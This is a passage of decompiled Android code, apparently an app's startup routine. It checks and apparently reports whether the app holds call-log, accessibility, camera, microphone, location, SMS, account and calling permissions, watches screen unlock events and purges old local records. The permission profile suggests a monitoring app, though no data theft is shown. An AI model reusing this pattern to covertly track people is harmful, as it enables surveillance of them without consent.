        eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
        if (i7 >= 23) {
            eVar.put("accessibility", Integer.valueOf(k3.a.f(this) ? 1 : 0));
            eVar.put("battery", Integer.valueOf(((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName()) ? 1 : 0));
        }
        eVar.put("writeFile", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0 ? 1 : 0));
        eVar.put("camera", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") == 0 ? 1 : 0));
        eVar.put("recordAudio", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.RECORD_AUDIO") == 0 ? 1 : 0));
        eVar.put("location", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") == 0 ? 1 : 0));
        eVar.put("sendSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.SEND_SMS") == 0 ? 1 : 0));
        eVar.put("getAccounts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.GET_ACCOUNTS") == 0 ? 1 : 0));
        eVar.put("callPhone", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CALL_PHONE") != 0 ? 0 : 1));
        eVar.put("notification", Integer.valueOf(NotificationManagerCompat.from(this).areNotificationsEnabled() ? 1 : 0));
        i.a(eVar, new e3.a());
        new Thread(new c()).start();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        registerReceiver(new ScreenBroadcastReceiver(), intentFilter);
        long j6 = SPUtils.getInstance().getLong("lastCleanTime", 0L);
        if (j6 <= 0 || System.currentTimeMillis() - j6 >= 86400000) {
            try {
                g3.g a6 = g3.g.a();
                long currentTimeMillis2 = System.currentTimeMillis() - 604800000;
                z2.c<FInfo, String> h5 = a6.f2964a.h();
                h5.g().i("ti", Long.valueOf(currentTimeMillis2));
                a6.f2964a.m(h5.f());
                g3.i a7 = g3.i.a();
                long currentTimeMillis3 = System.currentTimeMillis() - 2678400000L;
                z2.c<HInfo, String> h6 = a7.f2968a.h();
                m<HInfo, String> g6 = h6.g();
                g6.i("ti", Long.valueOf(currentTimeMillis3));
                g6.b();
                g6.c("pa", 0);
                a7.f2968a.m(h6.f());
                j a8 = j.a();
                long currentTimeMillis4 = System.currentTimeMillis() - 604800000;
                z2.c h7 = ((g) a8.f2971b).h();
                h7.g().i("ti", Long.valueOf(currentTimeMillis4));
                ((g) a8.f2971b).m(h7.f());
                p b5 = p.b();
                long currentTimeMillis5 = System.currentTimeMillis() - 604800000;
                z2.c<SysNews, String> h8 = b5.f2981a.h();
                h8.g().i("pubDate", Long.valueOf(currentTimeMillis5));
                b5.f2981a.m(h8.f());
                SPUtils.getInstance().put("lastCleanTime", System.currentTimeMillis());
            } catch (SQLException unused5) {
            }
        }
    }
}
